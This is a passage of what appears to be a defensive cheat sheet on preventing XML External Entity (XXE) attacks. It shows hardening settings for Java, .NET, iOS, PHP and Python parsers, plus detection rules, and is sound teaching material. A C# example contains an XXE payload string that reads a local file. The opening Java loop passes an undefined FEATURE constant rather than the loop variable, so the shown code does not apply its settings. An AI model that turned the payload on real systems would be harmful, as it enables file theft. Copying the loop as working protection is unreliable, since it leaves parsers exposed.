DocumentBuilderFactory.newInstance();\r\n\r\nString[] featuresToDisable = {\r\n    // Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-general-entities\r\n    // Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-general-entities\r\n    // JDK7+ - http://xml.org/sax/features/external-general-entities\r\n    //This feature has to be used together with the following one, otherwise it will not protect you from XXE for sure\r\n    \"http://xml.org/sax/features/external-general-entities\",\r\n\r\n    // Xerces 1 - http://xerces.apache.org/xerces-j/features.html#external-parameter-entities\r\n    // Xerces 2 - http://xerces.apache.org/xerces2-j/features.html#external-parameter-entities\r\n    // JDK7+ - http://xml.org/sax/features/external-parameter-entities\r\n    //This feature has to be used together with the previous one, otherwise it will not protect you from XXE for sure\r\n    \"http://xml.org/sax/features/external-parameter-entities\",\r\n\r\n    // Disable external DTDs as well\r\n    \"http://apache.org/xml/features/nonvalidating/load-external-dtd\"\r\n}\r\n\r\nfor (String feature : featuresToDisable) {\r\n    try {    \r\n        dbf.setFeature(FEATURE, false); \r\n    } catch (ParserConfigurationException e) {\r\n        // This should catch a failed setFeature feature\r\n        logger.info(\"ParserConfigurationException was thrown. The feature '\" + feature\r\n        + \"' is probably not supported by your XML processor.\");\r\n        ...\r\n    }\r\n}\r\n\r\ntry {\r\n    // Add these as per Timothy Morgan's 2014 paper: \"XML Schema, DTD, and Entity Attacks\"\r\n    dbf.setXIncludeAware(false);\r\n    dbf.setExpandEntityReferences(false);\r\n        \r\n    // As stated in the documentation \"Feature for Secure Processing (FSP)\" is the central mechanism to \r\n    // help safeguard XML processing. It instructs XML processors, such as parsers, validators, \r\n    // and transformers, to try and process XML securely. This can be used as an alternative to\r\n    // dbf.setExpandEntityReferences(false); to allow some safe level of Entity Expansion\r\n    // Exists from JDK6.\r\n    dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\r\n\r\n    // And, per Timothy Morgan: \"If for some reason support for inline DOCTYPEs are a requirement, then\r\n    // ensure the entity settings are disabled (as shown above) and beware that SSRF attacks\r\n    // (http://cwe.mitre.org/data/definitions/918.html) and denial\r\n    // of service attacks (such as billion laughs or decompression bombs via \"jar:\") are a risk.\"\r\n\r\n    // remaining parser logic\r\n    ...\r\n} catch (ParserConfigurationException e) {\r\n    // This should catch a failed setFeature feature\r\n    logger.info(\"ParserConfigurationException was thrown. The feature 'XMLConstants.FEATURE_SECURE_PROCESSING'\"\r\n    + \" is probably not supported by your XML processor.\");\r\n    ...\r\n} catch (SAXException e) {\r\n    // On Apache, this should be thrown when disallowing DOCTYPE\r\n    logger.warning(\"A DOCTYPE was passed into the XML document\");\r\n    ...\r\n} catch (IOException e) {\r\n    // XXE that points to a file that doesn't exist\r\n    logger.error(\"IOException occurred, XXE may still possible: \" + e.getMessage());\r\n    ...\r\n}\r\n\r\n// Load XML file or stream using a XXE agnostic configured parser...\r\nDocumentBuilder safebuilder = dbf.newDocumentBuilder();\r\n```\r\n\r\n[Xerces 1](https://xerces.apache.org/xerces-j/) [Features](https://xerces.apache.org/xerces-j/features.html):\r\n\r\n- Do not include external entities by setting [this feature](https://xerces.apache.org/xerces-j/features.html#external-general-entities) to `false`.\r\n- Do not include parameter entities by setting [this feature](https://xerces.apache.org/xerces-j/features.html#external-parameter-entities) to `false`.\r\n- Do not include external DTDs by setting [this feature](https://xerces.apache.org/xerces-j/features.html#load-external-dtd) to `false`.\r\n\r\n[Xerces 2](https://xerces.apache.org/xerces2-j/) [Features](https://xerces.apache.org/xerces2-j/features.html):\r\n\r\n- Disallow an inline DTD by setting [this feature](https://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl) to `true`.\r\n- Do not include external entities by setting [this feature](https://xerces.apache.org/xerces2-j/features.html#external-general-entities) to `false`.\r\n- Do not include parameter entities by setting [this feature](https://xerces.apache.org/xerces2-j/features.html#external-parameter-entities) to `false`.\r\n- Do not include external DTDs by setting [this feature](https://xerces.apache.org/xerces-j/features.html#load-external-dtd) to `false`.\r\n\r\n**Note:** The above defenses require Java 7 update 67, Java 8 update 20, or above, because the above countermeasures for `DocumentBuilderFactory` and SAXParserFactory are broken in earlier Java versions, per: [CVE-2014-6517](http://www.cvedetails.com/cve/CVE-2014-6517/).\r\n\r\n### XMLInputFactory (a StAX parser)\r\n\r\n[StAX](http://en.wikipedia.org/wiki/StAX) parsers such as [`XMLInputFactory`](http://docs.oracle.com/javase/7/docs/api/javax/xml/stream/XMLInputFactory.html) allow various properties and features to be set.\r\n\r\nTo protect a Java `XMLInputFactory` from XXE, disable DTDs (doctypes) altogether:\r\n\r\n``` java\r\n// This disables DTDs entirely for that factory\r\nxmlInputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false);\r\n```\r\n\r\nor if you can't completely disable DTDs:\r\n\r\n``` java\r\n// This causes XMLStreamException to be thrown if external DTDs are accessed.\r\nxmlInputFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\r\n// disable external entities\r\nxmlInputFactory.setProperty(\"javax.xml.stream.isSupportingExternalEntities\", false);\r\n```\r\n\r\nThe setting `xmlInputFactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");` is not required, as XMLInputFactory is dependent on Validator to perform XML validation against Schemas. Check the [Validator](#Validator) section for the specific configuration.\r\n\r\n### Oracle DOM Parser\r\n\r\nFollow [Oracle recommendation](https://docs.oracle.com/en/database/oracle/oracle-database/18/adxdk/security-considerations-oracle-xml-developers-kit.html#GUID-45303542-41DE-4455-93B3-854A826EF8BB) e.g.:\r\n\r\n``` java\r\n    // Extend oracle.xml.parser.v2.XMLParser\r\n    DOMParser domParser = new DOMParser();\r\n\r\n    // Do not expand entity references\r\n    domParser.setAttribute(DOMParser.EXPAND_ENTITYREF, false);\r\n\r\n    // dtdObj is an instance of oracle.xml.parser.v2.DTD\r\n    domParser.setAttribute(DOMParser.DTD_OBJECT, dtdObj);\r\n\r\n    // Do not allow more than 11 levels of entity expansion\r\n    domParser.setAttribute(DOMParser.ENTITY_EXPANSION_DEPTH, 12);\r\n```\r\n\r\n### TransformerFactory\r\n\r\nTo protect a `javax.xml.transform.TransformerFactory` from XXE, do this:\r\n\r\n``` java\r\nTransformerFactory tf = TransformerFactory.newInstance();\r\ntf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\r\ntf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");\r\n```\r\n\r\n### Validator\r\n\r\nTo protect a `javax.xml.validation.Validator` from XXE, do this:\r\n\r\n``` java\r\nSchemaFactory factory = SchemaFactory.newInstance(\"http://www.w3.org/2001/XMLSchema\");\r\nSchema schema = factory.newSchema();\r\nValidator validator = schema.newValidator();\r\nvalidator.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\r\nvalidator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");\r\n```\r\n\r\n### SchemaFactory\r\n\r\nTo protect a `javax.xml.validation.SchemaFactory` from XXE, do this:\r\n\r\n``` java\r\nSchemaFactory factory = SchemaFactory.newInstance(\"http://www.w3.org/2001/XMLSchema\");\r\nfactory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\r\nfactory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");\r\nSchema schema = factory.newSchema(Source);\r\n```\r\n\r\n### SAXTransformerFactory\r\n\r\nTo protect a `javax.xml.transform.sax.SAXTransformerFactory` from XXE, do this:\r\n\r\n``` java\r\nSAXTransformerFactory sf = SAXTransformerFactory.newInstance();\r\nsf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\r\nsf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\");\r\nsf.newXMLFilter(Source);\r\n```\r\n\r\n**Note: Use of the following `XMLConstants` requires JAXP 1.5, which was added to Java in 7u40 and Java 8:**\r\n\r\n- `javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD`\r\n- `javax.xml.XMLConstants.ACCESS_EXTERNAL_SCHEMA`\r\n- `javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET`\r\n\r\n### XMLReader\r\n\r\nTo protect a Java `org.xml.sax.XMLReader` from XXE, do this:\r\n\r\n``` java\r\nXMLReader reader = XMLReaderFactory.createXMLReader();\r\nreader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\n// This may not be strictly required as DTDs shouldn't be allowed at all, per previous line.\r\nreader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\r\nreader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\nreader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\n```\r\n\r\n### SAXReader\r\n\r\nTo protect a Java `org.dom4j.io.SAXReader` from XXE, do this:\r\n\r\n``` java\r\nsaxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\nsaxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\nsaxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\n```\r\n\r\nBased on testing, if you are missing one of these, you can still be vulnerable to an XXE attack.\r\n\r\n### SAXBuilder\r\n\r\nTo protect a Java `org.jdom2.input.SAXBuilder` from XXE, disallow DTDs (doctypes) entirely:\r\n\r\n``` java\r\nSAXBuilder builder = new SAXBuilder();\r\nbuilder.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true);\r\nDocument doc = builder.build(new File(fileName));\r\n```\r\n\r\nAlternatively, if DTDs can't be completely disabled, disable external entities and entity expansion:\r\n\r\n``` java\r\nSAXBuilder builder = new SAXBuilder();\r\nbuilder.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\nbuilder.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\nbuilder.setExpandEntities(false);\r\nDocument doc = builder.build(new File(fileName));\r\n```\r\n\r\n### No-op EntityResolver\r\n\r\nFor APIs that take an `EntityResolver`, you can neutralize an XML parser's ability to resolve entities by [supplying a no-op implementation](https://wiki.sei.cmu.edu/confluence/display/java/IDS17-J.+Prevent+XML+External+Entity+Attacks):\r\n\r\n```java\r\npublic final class NoOpEntityResolver implements EntityResolver {\r\n    public InputSource resolveEntity(String publicId, String systemId) {\r\n        return new InputSource(new StringReader(\"\"));\r\n    }\r\n}\r\n\r\n// ...\r\n\r\nxmlReader.setEntityResolver(new NoOpEntityResolver());\r\ndocumentBuilder.setEntityResolver(new NoOpEntityResolver());\r\n```\r\n\r\nor more simply:\r\n\r\n```java\r\nEntityResolver noop = (publicId, systemId) -> new InputSource(new StringReader(\"\"));\r\nxmlReader.setEntityResolver(noop);\r\ndocumentBuilder.setEntityResolver(noop);\r\n```\r\n\r\n### JAXB Unmarshaller\r\n\r\nSince a `javax.xml.bind.Unmarshaller` parses XML and does not support any flags for disabling XXE, it's imperative to parse the untrusted XML through a configurable secure parser first, generate a source object as a result, and pass the source object to the Unmarshaller. For example:\r\n\r\n``` java\r\nSAXParserFactory spf = SAXParserFactory.newInstance();\r\n\r\n//Option 1: This is the PRIMARY defense against XXE\r\nspf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\r\nspf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\r\nspf.setXIncludeAware(false);\r\n\r\n//Option 2: If disabling doctypes is not possible\r\nspf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\r\nspf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\r\nspf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\r\nspf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\r\nspf.setXIncludeAware(false);\r\n\r\n//Do unmarshall operation\r\nSource xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(),\r\n                                new InputSource(new StringReader(xml)));\r\nJAXBContext jc = JAXBContext.newInstance(Object.class);\r\nUnmarshaller um = jc.createUnmarshaller();\r\num.unmarshal(xmlSource);\r\n```\r\n\r\n### XPathExpression\r\n\r\nA `javax.xml.xpath.XPathExpression` can not be configured securely by itself, so the untrusted data must be parsed through another securable XML parser first.\r\n\r\nFor example:\r\n\r\n``` java\r\nDocumentBuilderFactory df = DocumentBuilderFactory.newInstance();\r\ndf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\");\r\ndf.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");\r\nDocumentBuilder builder = df.newDocumentBuilder();\r\nString result = new XPathExpression().evaluate( builder.parse(\r\n                            new ByteArrayInputStream(xml.getBytes())) );\r\n```\r\n\r\n### java.beans.XMLDecoder\r\n\r\nThe [readObject()](https://docs.oracle.com/javase/8/docs/api/java/beans/XMLDecoder.html#readObject--) method in this class is fundamentally unsafe.\r\n\r\nNot only is the XML it parses subject to XXE, but the method can be used to construct any Java object, and [execute arbitrary code as described here](http://stackoverflow.com/questions/14307442/is-it-safe-to-use-xmldecoder-to-read-document-files).\r\n\r\nAnd there is no way to make use of this class safe except to trust or properly validate the input being passed into it.\r\n\r\nAs such, we'd strongly recommend completely avoiding the use of this class and replacing it with a safe or properly configured XML parser as described elsewhere in this cheat sheet.\r\n\r\n### Other XML Parsers\r\n\r\nThere are many third-party libraries that parse XML either directly or through their use of other libraries. Please test and verify their XML parser is secure against XXE by default. If the parser is not secure by default, look for flags supported by the parser to disable all possible external resource inclusions like the examples given above. If there's no control exposed to the outside, make sure the untrusted content is passed through a secure parser first and then passed to insecure third-party parser similar to how the Unmarshaller is secured.\r\n\r\n#### Spring Framework MVC/OXM XXE Vulnerabilities\r\n\r\nFor example, some XXE vulnerabilities were found in [Spring OXM](https://pivotal.io/security/cve-2013-4152) and [Spring MVC](https://pivotal.io/security/cve-2013-7315). The following versions of the Spring Framework are vulnerable to XXE:\r\n\r\n- **3.0.0** to **3.2.3** (Spring OXM & Spring MVC)\r\n- **4.0.0.M1** (Spring OXM)\r\n- **4.0.0.M1-4.0.0.M2** (Spring MVC)\r\n\r\nThere were other issues as well that were fixed later, so to fully address these issues, Spring recommends you upgrade to Spring Framework 3.2.8+ or 4.0.2+.\r\n\r\nFor Spring OXM, this is referring to the use of org.springframework.oxm.jaxb.Jaxb2Marshaller. Note that the CVE for Spring OXM specifically indicates that 2 XML parsing situations are up to the developer to get right, and 2 are the responsibility of Spring and were fixed to address this CVE.\r\n\r\nHere's what they say:\r\n\r\nTwo situations developers must handle:\r\n\r\n- For a `DOMSource`, the XML has already been parsed by user code and that code is responsible for protecting against XXE.\r\n- For a `StAXSource`, the XMLStreamReader has already been created by user code and that code is responsible for protecting against XXE.\r\n\r\nThe issue Spring fixed:\r\n\r\nFor SAXSource and StreamSource instances, Spring processed external entities by default thereby creating this vulnerability.\r\n\r\nHere's an example of using a StreamSource that was vulnerable, but is now safe, if you are using a fixed version of Spring OXM or Spring MVC:\r\n\r\n``` java\r\nimport org.springframework.oxm.Jaxb2Marshaller;\r\nimport org.springframework.oxm.jaxb.Jaxb2Marshaller;\r\n\r\nJaxb2Marshaller marshaller = new Jaxb2Marshaller();\r\n// Must cast return Object to whatever type you are unmarshalling\r\nmarshaller.unmarshal(new StreamSource(new StringReader(some_string_containing_XML));\r\n```\r\n\r\nSo, per the [Spring OXM CVE writeup](https://pivotal.io/security/cve-2013-4152), the above is now safe. But if you were to use a DOMSource or StAXSource instead, it would be up to you to configure those sources to be safe from XXE.\r\n\r\n#### Castor\r\n\r\nCastor is a data binding framework for Java. It allows conversion between Java objects, XML, and relational tables. The XML features in Castor **prior to version 1.3.3** are vulnerable to XXE, and should be upgraded to the latest version. For additional information, check the official [XML configuration file](https://castor-data-binding.github.io/castor/reference-guide/reference/xml/xml-properties.html)\r\n\r\n## .NET\r\n\r\nThe following, up to date information for XXE injection in .NET is directly from this [web application of unit tests by Dean Fleming](https://github.com/deanf1/dotnet-security-unit-tests). This web application covers all currently supported .NET XML parsers, and has test cases for each demonstrating when they are safe from XXE injection and when they are not, but tests are only with injection from file and not direct DTD (used by DoS attacks).\r\n\r\nFor DoS attacks using a direct DTD (such as the [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)), a [separate testing application from Josh Grossman at Bounce Security](https://github.com/BounceSecurity/BillionLaughsTester) has been created to verify that .NET >=4.5.2 is safe from these attacks.\r\n\r\nPreviously, this information was based on some older articles which may not be 100% accurate including:\r\n\r\n- [James Jardine's excellent .NET XXE article](https://www.jardinesoftware.net/2016/05/26/xxe-and-net/).\r\n- [Guidance from Microsoft on how to prevent XXE and XML Denial of Service in .NET](http://msdn.microsoft.com/en-us/magazine/ee335713.aspx).\r\n\r\nThe following table lists all supported .NET XML parsers and their default safety levels. Note that in .NET Framework ≥4.5.2 **in all cases** if a DoS attempt is performed, an exception is thrown due to the expanded XML being too many characters.\r\n\r\nTable explanation:\r\n\r\n- ✅ = Not Vulnerable\r\n- ❌ = Vulnerable\r\n- ❓ = Not clear\r\n\r\n| Attack Type             | .NET Framework Version | [XDocument (Linq to XML)](#linq-to-xml)    | [XmlDictionaryReader](#xmldictionaryreader)   | [XmlDocument](#xmldocument) | [XmlNodeReader](#xmlnodereader)    | [XmlReader](#xmlreader)  | [XmlTextReader](#xmltextreader) | [XPathNavigator](#xpathnavigator) | [XslCompiledTransform](#xslcompiledtransform)  |\r\n|-|-|:-:|:-:|:-:|:-:|:-:|:-:|:-:|:-:|\r\n| **External entity Attacks** | <4.5.2 | ✅ | ✅  | ❌ | ✅  | ✅  | ❌ | ❌ | ✅ |\r\n|                             | ≥4.5.2 | ✅ | ✅  | ✅ | ✅  | ✅  | ✅ | ✅ | ✅ |\r\n| **Billion Laughs**          | <4.5.2 | ❓ | ✅  | ❌ | ✅  | ✅  | ❌ | ❌ | ✅ |\r\n|                             | ≥4.5.2 | ✅ | ✅\\* | ✅ | ✅\\* | ✅\\* | ✅ | ✅ | ✅ |\r\n\r\n\\* For .NET Framework Versions ≥4.5.2, these libraries won't even process the in-line DTD by default. Even if you change the default to allow processing a DTD, if a DoS attempt is performed an exception will still be thrown as documented above.\r\n\r\n### LINQ to XML\r\n\r\nBoth the `XElement` and `XDocument` objects in the `System.Xml.Linq` library are safe from XXE injection from external file and DoS attack by default. `XElement` parses only the elements within the XML file, so DTDs are ignored altogether. `XDocument` has XmlResolver [disabled by default](https://docs.microsoft.com/en-us/dotnet/standard/linq/linq-xml-security) so it's safe from SSRF. Whilst DTDs are [enabled by default](https://referencesource.microsoft.com/#System.Xml.Linq/System/Xml/Linq/XLinq.cs,71f4626a3d6f9bad), from Framework versions ≥4.5.2, it is **not** vulnerable to DoS as noted but it may be vulnerable in earlier Framework versions. For more information, see [Microsoft's guidance on how to prevent XXE and XML Denial of Service in .NET](http://msdn.microsoft.com/en-us/magazine/ee335713.aspx)\r\n\r\n### XmlDictionaryReader\r\n\r\n`System.Xml.XmlDictionaryReader` is safe by default, as when it attempts to parse the DTD, the compiler throws an exception saying that \"CData elements not valid at top level of an XML document\". It becomes unsafe if constructed with a different unsafe XML parser.\r\n\r\n### XmlDocument\r\n\r\nPrior to .NET Framework version 4.5.2, `System.Xml.XmlDocument` is **unsafe** by default. The `XmlDocument` object has an `XmlResolver` object within it that needs to be set to null in versions prior to 4.5.2. In versions 4.5.2 and up, this `XmlResolver` is set to null by default.\r\n\r\nThe following example shows how it is made safe:\r\n\r\n``` csharp\r\n static void LoadXML()\r\n {\r\n   string xxePayload = \"<!DOCTYPE doc [<!ENTITY win SYSTEM 'file:///C:/Users/testdata2.txt'>]>\"\r\n                     + \"<doc>&win;</doc>\";\r\n   string xml = \"<?xml version='1.0' ?>\" + xxePayload;\r\n\r\n   XmlDocument xmlDoc = new XmlDocument();\r\n   // Setting this to NULL disables DTDs - Its NOT null by default.\r\n   xmlDoc.XmlResolver = null;\r\n   xmlDoc.LoadXml(xml);\r\n   Console.WriteLine(xmlDoc.InnerText);\r\n   Console.ReadLine();\r\n }\r\n```\r\n\r\nFor .NET Framework version ≥4.5.2, this is **safe by default**.\r\n\r\n`XmlDocument` can become unsafe if you create your own nonnull `XmlResolver` with default or unsafe settings. If you need to enable DTD processing, instructions on how to do so safely are described in detail in the [referenced MSDN article](https://msdn.microsoft.com/en-us/magazine/ee335713.aspx).\r\n\r\n### XmlNodeReader\r\n\r\n`System.Xml.XmlNodeReader` objects are safe by default and will ignore DTDs even when constructed with an unsafe parser or wrapped in another unsafe parser.\r\n\r\n### XmlReader\r\n\r\n`System.Xml.XmlReader` objects are safe by default.\r\n\r\nThey are set by default to have their ProhibitDtd property set to false in .NET Framework versions 4.0 and earlier, or their `DtdProcessing` property set to Prohibit in .NET versions 4.0 and later.\r\n\r\nAdditionally, in .NET versions 4.5.2 and later, the `XmlReaderSettings` belonging to the `XmlReader` has its `XmlResolver` set to null by default, which provides an additional layer of safety.\r\n\r\nTherefore, `XmlReader` objects will only become unsafe in version 4.5.2 and up if both the `DtdProcessing` property is set to Parse and the `XmlReaderSetting`'s `XmlResolver` is set to a nonnull XmlResolver with default or unsafe settings. If you need to enable DTD processing, instructions on how to do so safely are described in detail in the [referenced MSDN article](https://msdn.microsoft.com/en-us/magazine/ee335713.aspx).\r\n\r\n### XmlTextReader\r\n\r\n`System.Xml.XmlTextReader` is **unsafe** by default in .NET Framework versions prior to 4.5.2. Here is how to make it safe in various .NET versions:\r\n\r\n#### Prior to .NET 4.0\r\n\r\nIn .NET Framework versions prior to 4.0, DTD parsing behavior for `XmlReader` objects like `XmlTextReader` are controlled by the Boolean `ProhibitDtd` property found in the `System.Xml.XmlReaderSettings` and `System.Xml.XmlTextReader` classes.\r\n\r\nSet these values to true to disable inline DTDs completely.\r\n\r\n``` csharp\r\nXmlTextReader reader = new XmlTextReader(stream);\r\n// NEEDED because the default is FALSE!!\r\nreader.ProhibitDtd = true;  \r\n```\r\n\r\n#### .NET 4.0 - .NET 4.5.2\r\n\r\nIn .NET Framework version 4.0, DTD parsing behavior has been changed. The `ProhibitDtd` property has been deprecated in favor of the new `DtdProcessing` property.\r\n\r\nHowever, they didn't change the default settings so `XmlTextReader` is still vulnerable to XXE by default.\r\n\r\nSetting `DtdProcessing` to `Prohibit` causes the runtime to throw an exception if a `<!DOCTYPE>` element is present in the XML.\r\n\r\nTo set this value yourself, it looks like this:\r\n\r\n``` csharp\r\nXmlTextReader reader = new XmlTextReader(stream);\r\n// NEEDED because the default is Parse!!\r\nreader.DtdProcessing = DtdProcessing.Prohibit;  \r\n```\r\n\r\nAlternatively, you can set the `DtdProcessing` property to `Ignore`, which will not throw an exception on encountering a `<!DOCTYPE>` element but will simply skip over it and not process it. Finally, you can set `DtdProcessing` to `Parse` if you do want to allow and process inline DTDs.\r\n\r\n#### .NET 4.5.2 and later\r\n\r\nIn .NET Framework versions 4.5.2 and up, `XmlTextReader`'s internal `XmlResolver` is set to null by default, making the `XmlTextReader` ignore DTDs by default. The `XmlTextReader` can become unsafe if you create your own nonnull `XmlResolver` with default or unsafe settings.\r\n\r\n### XPathNavigator\r\n\r\n`System.Xml.XPath.XPathNavigator` is **unsafe** by default in .NET Framework versions prior to 4.5.2.\r\n\r\nThis is due to the fact that it implements `IXPathNavigable` objects like `XmlDocument`, which are also unsafe by default in versions prior to 4.5.2.\r\n\r\nYou can make `XPathNavigator` safe by giving it a safe parser like `XmlReader` (which is safe by default) in the `XPathDocument`'s constructor.\r\n\r\nHere is an example:\r\n\r\n``` csharp\r\nXmlReader reader = XmlReader.Create(\"example.xml\");\r\nXPathDocument doc = new XPathDocument(reader);\r\nXPathNavigator nav = doc.CreateNavigator();\r\nstring xml = nav.InnerXml.ToString();\r\n```\r\n\r\nFor .NET Framework version ≥4.5.2, XPathNavigator is **safe by default**.\r\n\r\n### XslCompiledTransform\r\n\r\n`System.Xml.Xsl.XslCompiledTransform` (an XML transformer) is safe by default as long as the parser it's given is safe.\r\n\r\nIt is safe by default because the default parser of the `Transform()` methods is an `XmlReader`, which is safe by default (per above).\r\n\r\n[The source code for this method is here.](http://www.dotnetframework.org/default.aspx/4@0/4@0/DEVDIV_TFS/Dev10/Releases/RTMRel/ndp/fx/src/Xml/System/Xml/Xslt/XslCompiledTransform@cs/1305376/XslCompiledTransform@cs)\r\n\r\nSome of the `Transform()` methods accept an `XmlReader` or `IXPathNavigable` (e.g., `XmlDocument`) as an input, and if you pass in an unsafe XML Parser then the `Transform` will also be unsafe.\r\n\r\n## iOS\r\n\r\n### libxml2\r\n\r\niOS includes the C/C++ libxml2 library described above, so that guidance applies if you are using libxml2 directly.\r\n\r\nHowever, the version of libxml2 provided up through iOS6 is prior to version 2.9 of libxml2 (which protects against XXE by default).\r\n\r\n### NSXMLDocument\r\n\r\niOS also provides an `NSXMLDocument` type, which is built on top of libxml2.\r\n\r\nHowever, `NSXMLDocument` provides some additional protections against XXE that aren't available in libxml2 directly.\r\n\r\nPer the 'NSXMLDocument External Entity Restriction API' section of this [page](https://developer.apple.com/library/archive/releasenotes/Foundation/RN-Foundation-iOS/Foundation_iOS5.html):\r\n\r\n- iOS4 and earlier: All external entities are loaded by default.\r\n- iOS5 and later: Only entities that don't require network access are loaded. (which is safer)\r\n\r\nHowever, to completely disable XXE in an `NSXMLDocument` in any version of iOS you simply specify `NSXMLNodeLoadExternalEntitiesNever` when creating the `NSXMLDocument`.\r\n\r\n## PHP\r\n\r\nWhen using the default XML parser (based on libxml2), PHP 8.0 and newer [prevent XXE by default](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php).\r\n\r\nFor PHP versions prior to 8.0, per [the PHP documentation](https://www.php.net/manual/en/function.libxml-set-external-entity-loader.php), the following should be set when using the default PHP XML parser in order to prevent XXE:\r\n\r\n``` php\r\nlibxml_set_external_entity_loader(null);\r\n```\r\n\r\nA description of how to abuse this in PHP is presented in a good [SensePost article](https://www.sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/) describing a cool PHP based XXE vulnerability that was fixed in Facebook.\r\n\r\n## Python\r\n\r\nThe Python 3 official documentation contains a section on [xml vulnerabilities](https://docs.python.org/3/library/xml.html#xml-vulnerabilities). As of the 1st January 2020 Python 2 is no longer supported, however the Python website still contains [some legacy documentation](https://docs.Python.org/2/library/xml.html#xml-vulnerabilities).\r\n\r\nThe following table gives an overview of various modules in Python 3 used for XML parsing and whether or not they are vulnerable.\r\n\r\n| Attack Type               | sax        | etree      | minidom    | pulldom    | xmlrpc     |\r\n|---------------------------|------------|------------|------------|------------|------------|\r\n| Billion Laughs            | Vulnerable | Vulnerable | Vulnerable | Vulnerable | Vulnerable |\r\n| Quadratic Blowup          | Vulnerable | Vulnerable | Vulnerable | Vulnerable | Vulnerable |\r\n| External Entity Expansion | Safe       | Safe       | Safe       | Safe       | Safe       |\r\n| DTD Retrieval             | Safe       | Safe       | Safe       | Safe       | Safe       |\r\n| Decompression Bomb        | Safe       | Safe       | Safe       | Safe       | Vulnerable |\r\n\r\nTo protect your application from the applicable attacks, [two packages](https://docs.python.org/3/library/xml.html#the-defusedxml-and-defusedexpat-packages) exist to help you sanitize your input and protect your application against DDoS and remote attacks.\r\n\r\n## Semgrep Rules\r\n\r\n[Semgrep](https://semgrep.dev/) is a command-line tool for offline static analysis. Use pre-built or custom rules to enforce code and security standards in your codebase.\r\n\r\n### Java\r\n\r\nBelow are the rules for different XML parsers in Java\r\n\r\n#### Digester\r\n\r\nIdentifying XXE vulnerability in the `org.apache.commons.digester3.Digester` library\r\nRule can be played here [https://semgrep.dev/s/salecharohit:xxe-Digester](https://semgrep.dev/s/salecharohit:xxe-Digester)\r\n\r\n#### DocumentBuilderFactory\r\n\r\nIdentifying XXE vulnerability in the `javax.xml.parsers.DocumentBuilderFactory` library\r\nRule can be played here [https://semgrep.dev/s/salecharohit:xxe-dbf](https://semgrep.dev/s/salecharohit:xxe-dbf)\r\n\r\n#### SAXBuilder\r\n\r\nIdentifying XXE vulnerability in the `org.jdom2.input.SAXBuilder` library\r\nRule can be played here [https://semgrep.dev/s/salecharohit:xxe-saxbuilder](https://semgrep.dev/s/salecharohit:xxe-saxbuilder)\r\n\r\n#### SAXParserFactory\r\n\r\nIdentifying XXE vulnerability in the `javax.xml.parsers.SAXParserFactory` library\r\nRule can be played here [https://semgrep.dev/s/salecharohit:xxe-SAXParserFactory](https://semgrep.dev/s/salecharohit:xxe-SAXParserFactory)\r\n\r\n#### SAXReader\r\n\r\nIdentifying XXE vulnerability in the `org.dom4j.io.SAXReader` library\r\nRule can be played here [https://semgrep.dev/s/salecharohit:xxe-SAXReader](https://semgrep.dev/s/salecharohit:xxe-SAXReader)\r\n\r\n#### XMLInputFactory\r\n\r\nIdentifying XXE vulnerability in the `javax.xml.stream.XMLInputFactory` library\r\nRule can be played here [https://semgrep.dev/s/salecharohit:xxe-XMLInputFactory](https://semgrep.dev/s/salecharohit:xxe-XMLInputFactory)\r\n\r\n#### XMLReader\r\n\r\nIdentifying XXE vulnerability in the `org.xml.sax.XMLReader` library\r\nRule can be played here [https://semgrep.dev/s/salecharohit:xxe-XMLReader](https://semgrep.dev/s/salecharohit:xxe-XMLReader)\r\n\r\n## References\r\n\r\n- [XXE by InfoSecInstitute](https://resources.infosecinstitute.com/identify-mitigate-xxe-vulnerabilities/)\r\n- [OWASP Top 10-2017 A4: XML External Entities (XXE)](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_%28XXE%29)\r\n- [Timothy Morgan's 2014 paper: \"XML Schema, DTD, and Entity Attacks\"](https://vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf)\r\n- [FindSecBugs XXE Detection](https://find-sec-bugs.github.io/bugs.htm#XXE_SAXPARSER)\r\n- [XXEbugFind Tool](https://github.com/ssexxe/XXEBugFind)\r\n- [Testing for XML 